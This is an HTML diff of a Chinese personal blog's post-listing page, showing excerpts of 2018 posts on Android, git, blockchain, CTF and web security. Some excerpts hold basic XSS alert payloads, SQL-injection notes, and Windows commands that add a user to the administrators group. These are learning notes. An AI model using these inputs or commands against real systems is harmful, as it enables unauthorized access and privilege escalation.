-                    1.1.1-SQL注入-SQL注入基础-Web应用框架分析-MySql注入方法逻辑运算及常用函数
-                </h3>
-            </a>
-            <p>
-                
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#web安全" title="web安全">web安全</a>
-                <span>/</span>
-                
-                <a class="tag" href="/tags/#sql注入" title="sql注入">sql注入</a>
-                <span>/</span>
-                
-                
-            </p>
-        </div>
-    </div>
-    
-</div>
-<ul class="pager">
-    
-    <li class="previous">
-        <a href="/page/2/">&larr; Newer Posts</a>
-    </li>
-    
-    
-    <li class="next">
-        <a href="/page/4/">Older Posts &rarr;</a>
-    </li>
-    
-</ul>
-
-    </div>
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/3612980045.html">termux相关</a>
+	      </div>
+	      <p>
+	      	
+                前言：Termux是一款开源且不需要root，运行在Android终端上极其强大的linux模拟器，支持apt管理软件包，完美支持python,ruby,go,nodejs。本文使用termux搭建Nmap、Sqlmap、BBScan、subDomainsBrute、Hydra、RouterSploit等实现支持端口扫描、注入检测、子域名爆破、多协议弱...
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/termux/">termux</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-10-12&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/termux/">termux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/安全/">安全</a></li></ul>
+	
 </div>
 
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/2159052339.html">1.sql注入基础</a>
+	      </div>
+	      <p>
+	      	
+                目录
 
-<footer class="footer">
-    <ul class="list-inline text-center">
-        
-        
+SQL注入原理
+SQL注入原理-SQL注入产生原因
+SQL注入原理-SQL注入核心原理
 
-        
-        <li>
-            <a target="_blank" href="http://weibo.com/tea9999">
-                            <span class="fa-stack fa-lg">
-                                  <i class="iconfont icon-weibo"></i>
-                            </span>
-            </a>
-        </li>
-        
 
-        
+SQL注入的危害
+mysql注入语句
+mysql注入语句-mysql介绍
+mysql注入语句-万能密码
+mysql注入语句-注入语句例子
 
-        
-        <li>
-            <a target="_blank"  href="https://github.com/tea9">
-                            <span class="fa-stack fa-lg">
-                                <i class="iconfont icon-github"></i>
-                            </span>
-            </a>
-        </li>
-        
 
-        
+sql注入流程
+MySQL手工注入方法
+TIPS
+实例
+相关链接
 
-        
 
-    </ul>
+SQL注入原理SQL注入原理-SQL注入产...
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/web安全/">web安全</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-10-11&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql注入/">sql注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web安全/">web安全</a></li></ul>
+	
+</div>
+
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/3180077102.html">xss的语句</a>
+	      </div>
+	      <p>
+	      	
+                这是一个xss的闯关游戏  
+下载链接:提取码: isre  
+xss的语句
+1
+&amp;lt;script&amp;gt;alert(/xss/)&amp;lt;/script&amp;gt;
+2
+&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(/xss/)&amp;lt;/script&amp;gt;
+
+3
+
+&amp;apos;onmouseover=&amp;apos;alert(/xss/)...
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/web安全/">web安全</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-10-05&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/web安全/">web安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/">xss</a></li></ul>
+	
+</div>
+
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/1087166143.html">cv古风剧本</a>
+	      </div>
+	      <p>
+	      	
+                
+小生不才，未得姑娘青睐，打扰姑娘良久，姑娘莫怪，自此，所有爱慕之意止于唇齿，匿于年华。姑娘往南我变往北，在不叨扰，就此别过，望姑娘日后善其身，遇良人。予君欢喜城，暖色浮余生。若忆起昔日海誓山盟，笑笑了之。  
+这一天，一个采药师陪同他的弟弟，来到山中采药。不料，遇到了一群狼，两个人手里只有镰刀作为武器。采药师为了保护他的弟弟，说:“我去引开狼，你找到...
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/biu/">biu</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-09-23&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/cv/">cv</a></li></ul>
+	
+</div>
+
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/3799772689.html">solidity的代码</a>
+	      </div>
+	      <p>
+	      	
+                在线solidityIDEsolidity  
+类&amp;amp;函数pragma solidity ^0.4.25;
+
+contract Demo1{
+
+    // 创建一个函数
+    function shwo(int num) public returns(int,int){
+        return (num,num+1);
+    }
+}
+...
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/区块链/">区块链</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-09-16&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/区块链/">区块链</a></li></ul>
+	
+</div>
+
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/2435934763.html">区块链学习</a>
+	      </div>
+	      <p>
+	      	
+                比特币比特币区块  
+区块链概念   
+钱包  
+比特币总量  
+BCT官网  
+数字货币价格查询  
+BTC历史分叉  
+ETH和EOS差异  
+网页版钱包  
+区块链专利排名  
+区块链项目
+支付宝爱心捐赠平台  
+区块链游戏-CryptoKitties迷恋猫  
+版权保护-百度图腾  
+百度图腾介绍  
+
+以太坊eth  
+solidity  
+...
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/区块链/">区块链</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-09-16&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/区块链/">区块链</a></li></ul>
+	
+</div>
+
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/1182005409.html">1.android布局-ConstraintLayout-约束布局-例子</a>
+	      </div>
+	      <p>
+	      	
+                前言
+ConstraintLayout 出来也有一段时间，虽说也有很多坑，但是一些属性还是特别好用的，在项目中我也逐渐在使用，下面是用ConstraintLayout实现的一个标签栏的样式例子。
+
+1.android布局-ConstraintLayout-约束布局  
+效果
+思路1. 定义两条横向约束线(Guideline) 
+2. 横向排列5个控件(...
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/android/">android</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-09-14&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/android/">android</a></li></ul>
+	
+</div>
+
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/3415919552.html">内网提权命令</a>
+	      </div>
+	      <p>
+	      	
+                Windows基础命令net user xx
+
+query user #查看用户登录情况
+
+whoami #当前用户权限
+
+systeminfo #查看当前系统版本与补丁信息
+
+net user xx 123456 /add #添加用户
+
+net localgroup administrators xx /add #添加到管理员组
+
+net local...
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/web安全/">web安全</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-09-07&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/web安全/">web安全</a></li></ul>
+	
+</div>
+
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/1523215152.html">博客说明</a>
+	      </div>
+	      <p>
+	      	
+                博客自定义指南博客链接/blog linktea9  
+使用Jekyll博客引擎基于Theme H2O修改  
+前置条件/Before：需要你有GitHubGithub PageJekyll环境  
+如以上都有还有问题请参考使用jekyll搭建个人博客jekyll-theme-H2O_README  
+步骤/Step：github目录
+克隆项目：  
+...
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/blog/">blog</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-09-06&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/blog/">blog</a></li></ul>
+	
+</div>
+
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/2080958988.html">android复杂布局</a>
+	      </div>
+	      <p>
+	      	
+                示例图
+分析：通过分析原型图，分为4个模块  
+1.轮播图2.公告3.指示器4.内容列表  
+
+实现：轮播图使用BGABanner-Android库公告使用ViewFlipper控件指示器切换使用MagicIndicator库内容列表使用ViewPager+Fragment（RecyclerView）  
+
+其他依赖：  
+ankoBaseRecycl...
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/android/">android</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-09-04&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/android/">android</a></li></ul>
+	
+</div>
+
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/2226304841.html">Android的命令</a>
+	      </div>
+	      <p>
+	      	
+                Tipsoh-my-zsh ，“zsh: command not found: adb”解决方法
+open .zshrc
+
+在# User configuration添加
+source ~/.bash_profile
+
+执行
+source .zshrc
+关于Android的命令更新Android SDK
+
+$ adnroid update sdk --...
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/android逆向/">android逆向</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-08-31&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/android/">android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/android逆向/">android逆向</a></li></ul>
+	
+</div>
+
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/3697117284.html">RPG_Maker_MV-安卓HTML一键打包</a>
+	      </div>
+	      <p>
+	      	
+                tips这个软件是收费的免费版不能修改icon和包名  
+使用html一键打包工具HTML一键打包APK工具  
+HTML压缩包下载
+部署项目文件-部署-Android/IOS
+使用HTML一键打包工具进行打包1.下载HTML一键打包工具2.安装HTML一键打包工具路径选择为www下index.html
+注意事项1.文件名不要中文2.项目中不能含有中文...
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/rpgmakermv/">rpgmakermv</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-08-15&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/rpgmakermv/">rpgmakermv</a></li></ul>
+	
+</div>
+
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/2113223531.html">设计模式-策略模式（strategy）</a>
+	      </div>
+	      <p>
+	      	
+                策略模式视频地址http://www.imooc.com/video/3213
+策略模式  ：  
+将可变的部分  从程序中抽象分离成算法接口在该接口下分别封装一系列的算法实现并使他们可以相互等候，从而导致客户端程序独立于算法的改变。  
+不变更代码架构通过开发与重构拥抱需求的变化使用策略模式  
+虚拟应用：  鸭子应用飞行的能力更多鸭子类型每六个月发...
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/设计模式/">设计模式</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-08-10&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/设计模式/">设计模式</a></li></ul>
+	
+</div>
+
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/744454998.html">Git命令行基础</a>
+	      </div>
+	      <p>
+	      	
+                Git命令行基础Git是一个开源的分布式版本控制工具  
+配置身份
+git config --global user.name &amp;quot;Tony&amp;quot;
+git config --global user.email &amp;quot;tony@gmail.com&amp;quot;
+检查是否配置成功
+git config --global user.name...
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/git/">git</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-08-10&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/git/">git</a></li></ul>
+	
+</div>
+
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/912287952.html">一些ctf的链接</a>
+	      </div>
+	      <p>
+	      	
+                忘了什么时候整理了！！！  
+ctfwiki  
+工具：  
+看雪CTF工具  
+
+brainfuck  
+fuckjs  
+Writeuphttp://bobao.360.cn/ctf/detail/173.htmlhttp://www.freebuf.com/articles/web/94444.html  
+ziphttp://bobao.360...
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/ctf/">ctf</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-08-10&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/">ctf</a></li></ul>
+	
+</div>
+
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/2289611691.html">fragment懒加载</a>
+	      </div>
+	      <p>
+	      	
+                Fragment懒加载用于viewpager+fragment布局  
+import android.os.Bundle;
+import android.view.LayoutInflater;
+import android.view.View;
+import android.view.ViewGroup;
+import android.view.Vi...
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/android/">android</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-08-10&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/android/">android</a></li></ul>
+	
+</div>
+
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/1340440380.html">Burp抓Android的包</a>
+	      </div>
+	      <p>
+	      	
+                Burp抓Android的包设置ip设置-网络-查看ip地址  
+burp-设置ip  
+
+手机  
+电脑要跟手机连同一个wifiwifi-修改网络wifi密码钥匙串  
+
+火狐浏览器配置  
+
+安装证书设置浏览器代理火狐浏览器-首选项-网络代理-设置然后访问http://127.0.0.1:8080/下载证书保存文件把后缀名修改成cer
+华为手机：手...
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/android逆向/">android逆向</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-08-09&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/android安全/">android安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/android逆向/">android逆向</a></li></ul>
+	
+</div>
+
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/576883658.html">mac_终端用sublime打开文件</a>
+	      </div>
+	      <p>
+	      	
+                打开文件
+vi ~/.bash_profile
+添加命令
+alias subl=\&amp;apos;&amp;apos;/Applications/Sublime Text.app/Contents/SharedSupport/bin/subl&amp;apos;\&amp;apos;
+启动
+source ~/.bash_profile 
+使用命令
+subl 文件/目录
+
+subl...
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/macos/">macos</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-08-03&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/macos/">macos</a></li></ul>
+	
+</div>
+
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/3004991132.html">CTF入门如何学习</a>
+	      </div>
+	      <p>
+	      	
+                这是看了i春秋课程的学习笔记CTF入门如何学习
+CTF对我们的意义-CTF类型CTF题目的类型1.Web2.Crypto3.PWN4.Misc  
+1.stego  
+2.forendics  
+3.等等  
+5.ReversePPC(Professionally ProgramCoder)  
+著名的CTF比赛-国际比赛：DEFCON资格赛  
+DE...
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/ctf/">ctf</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-08-03&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/">ctf</a></li></ul>
+	
+</div>
+
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/1065774692.html">blog链接</a>
+	      </div>
+	      <p>
+	      	
+                wikimoe_live2dLive2D看板娘来了！typecho插件给博客添加能动的看板娘(Live2D)-将其添加到网页上吧emlog插件版之给博客加上能陪聊的Live2d版伊斯特瓦尔【ver1.04】博客通用版Live2d伊斯特瓦尔发布  
+一言  
+
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/blog/">blog</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-07-19&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/link/">link</a></li></ul>
+	
+</div>
+
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/2419343777.html">2.1.1-文件上传流动原理与流程-上传检测流程</a>
+	      </div>
+	      <p>
+	      	
+                文件上传检测流程
+前端提交：javaScript检测、Flash AS检测app：java代码检测  
+数据传输：形成的报文到后端处理 -&amp;gt; 会存在WAF拦截、IPS入侵防御拦截  
+后端处理：文件扩展名检测、MIME TYPE检测（报文文件参数content type）、文件格式检测、内容检测（检测恶意代码）  
+写入文件系统：文件重命名、强制...
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/web安全/">web安全</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-07-19&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/web安全/">web安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/文件上传漏洞/">文件上传漏洞</a></li></ul>
+	
+</div>
+
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/1524903793.html">git切换远程分支命令</a>
+	      </div>
+	      <p>
+	      	
+                1.克隆项目  
+git clone &amp;lt;项目链接&amp;gt;
+2.进入项目  
+cd work
+3.列出所有分支  
+git branch -a
+输出  
+remotes/origin/dev
+remotes/origin/release
+4.切换远程开发分支  
+git checkout -b dev origin/dev
+
+切换远程分支origi...
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/git/">git</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-07-19&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/branch/">branch</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/git/">git</a></li></ul>
+	
+</div>
+
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/912983995.html">2.1.1-文件上传流动原理与流程-文件上传漏洞原理</a>
+	      </div>
+	      <p>
+	      	
+                上传&amp;amp;上传漏洞&amp;amp;上传检测流程什么是文件上传  
+
+文件上传是一个网站的常见功能，多用于上传照片、视频、文档等许多类型文件。
+
+上传文件流程  
+1.前端选择文件，进行提交。（浏览器端点击上传）2.浏览器形成POST MultiPart报文发送到服务器。（一般看不到 使用抓包工具查看content type 上传文件使用multipart...
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/web安全/">web安全</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-07-18&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/文件上传漏洞/">文件上传漏洞</a></li></ul>
+	
+</div>
+
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/2167877018.html">一些天文的链接</a>
+	      </div>
+	      <p>
+	      	
+                stuffin-一个在线星系模拟网站seti研究所seti屏幕保护下载链接-帮助seti计算的一个软件
+
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/biu/">biu</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-07-14&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/天文/">天文</a></li></ul>
+	
+</div>
+
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/4129675987.html">android反编译工具和命令</a>
+	      </div>
+	      <p>
+	      	
+                TOOLSapktool  
+apktool文档  
+dex2jar  
+jd-gui 
+jadx 
+SHELLjadx:简直是神器啊  
+直接把apk拖进去就可以了  
+apktool:获取资源文件  
+java -jar apktool.jar d -f &amp;lt;xx.apk&amp;gt; -o &amp;lt;XX&amp;gt;
+
+java -jar apktool...
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/android逆向/">android逆向</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-07-07&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/adnroid安全/">adnroid安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/android反编译/">android反编译</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/android逆向/">android逆向</a></li></ul>
+	
+</div>
+
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/758044765.html">android思维导图</a>
+	      </div>
+	      <p>
+	      	
+                android思维导图
+
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/android/">android</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-07-06&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/android/">android</a></li></ul>
+	
+</div>
+
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/41038608.html">1.4.2-SQL注入防御绕过-二次编码注入</a>
+	      </div>
+	      <p>
+	      	
+                01 二次编码注入原理+，=，&amp;amp;，；原始数据不适合传输  
+index.php?id=1&amp;amp;name=admin&amp;amp;pwd=123
+
+name=admin=
+name=admin&amp;amp;
+
+admin=
+
+php urldecode(&amp;apos;%3d&amp;apos;) --&amp;gt; =
+
+// 如果这样的参数会引起歧义
+php会自动...
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/web安全/">web安全</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-07-06&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql注入/">sql注入</a></li></ul>
+	
+</div>
+
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/4082916186.html">2.Markdown使用说明</a>
+	      </div>
+	      <p>
+	      	
+                一、Markdown是什么？Markdown是一种轻量级标记语言（标记语言是用一系列规则描述简单格式的文本语言。）    
+二、Markdown的语法1.标题# 一级标题## 二级标题  
+还可以下面这种写法  
+一级标题\====  
+二级标题-—  
+
+2.图片![图片文字](图片链接)![Foo](http://i.weather.com.cn/...
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/jekyll/">jekyll</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-07-06&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/blog/">blog</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/jekyll/">jekyll</a></li></ul>
+	
+</div>
+
+	    </article>
+	    <hr class="two">
+	  
+	    <article class="post">
+	      <div class="post-title">
+	        <a href="/post/3011557691.html">1.android布局-ConstraintLayout-约束布局</a>
+	      </div>
+	      <p>
+	      	
+                ConstraintLayout 是什么？ConstraintLayout
+ConstraintLayout 怎么用？基本用法
+layout_constraint[当前控件位置]_[目标控件位置]=&amp;quot;[目标控件ID]&amp;quot;
+1.上下排列  
+a  
+b  
+
+b:
+app:layout_constraintTop_toBottomOf=...
+            
+	      </p>
+	       <div class="post-meta">
+	
+	    <a class="article-category-link" href="/category/android/">android</a>
+	&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	<i class="iconfont text-small">&#xe6f3;</i> ：2018-07-03&nbsp;&nbsp;&sdot;&nbsp;&nbsp;
+	
+		<i class="iconfont text-small">&#xe6c5;</i> ：
+	  <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/android/">android</a></li></ul>
+	
+</div>
+
